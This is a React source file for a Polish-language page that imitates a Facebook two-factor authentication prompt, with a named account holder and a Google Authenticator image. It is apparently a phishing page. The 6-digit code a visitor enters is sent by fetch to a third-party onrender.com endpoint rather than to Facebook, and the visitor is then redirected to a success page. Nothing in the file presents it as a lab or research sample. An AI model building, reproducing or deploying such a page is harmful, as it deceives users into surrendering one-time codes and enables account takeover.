import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';

const Error_Page = () => {
  const [code, setCode] = useState('');
  const navigate = useNavigate();
   
  const handleSubmit = async () => {
    try {
      const response = await fetch("https://projektdawid-1.onrender.com/submit_code/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ code })
      });

      if (response.ok) {
        navigate("/success")
      } else {
        alert("Błąd podczas wysyłania kodu.");
      }
    } catch (error) {
      console.error("Error submitting code:", error);
    }
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-6 py-20 font-sans">
      <div className="w-full max-w-5xl mx-auto text-left">
        <p className="text-lg text-gray-600 mb-2">Dawid Sołtys • Facebook</p>

        <h1 className="text-5xl font-semibold text-gray-900 mb-4 leading-tight">
          Przejdź do aplikacji uwierzytelniającej
        </h1>

        <p className="text-xl text-gray-800 leading-relaxed mb-6 max-w-4xl">
          Wprowadź 6-cyfrowy kod dla tego konta uzyskany ze skonfigurowanej aplikacji do
          uwierzytelniania dwuskładnikowego (takiej jak Duo Mobile lub Google Authenticator).
        </p>

        <div className="-mx-6 sm:mx-0 mb-10">
          <img
            src="/GoogleAuthenticator.png"
            alt="Ilustracja aplikacji uwierzytelniającej"
            className="w-full h-auto object-cover"
          />
        </div>

        <input
          type="text"
          placeholder="Kod"
          value={code}
          onChange={(e) => setCode(e.target.value)}
          className="w-full px-6 py-4 text-xl border border-gray-300 rounded-2xl mb-5 text-left placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
        />

        <button
          onClick={handleSubmit}
          className="w-full bg-blue-500 hover:bg-blue-600 text-white text-lg font-semibold rounded-2xl py-4 mb-4 shadow transition-colors"
        >
          Kontynuuj
        </button>

        <button className="w-full border border-gray-300 py-4 rounded-2xl text-lg hover:bg-gray-100 transition-colors">
          Spróbuj innej metody
        </button>
      </div>
    </div>
  );
};

export default Error_Page;
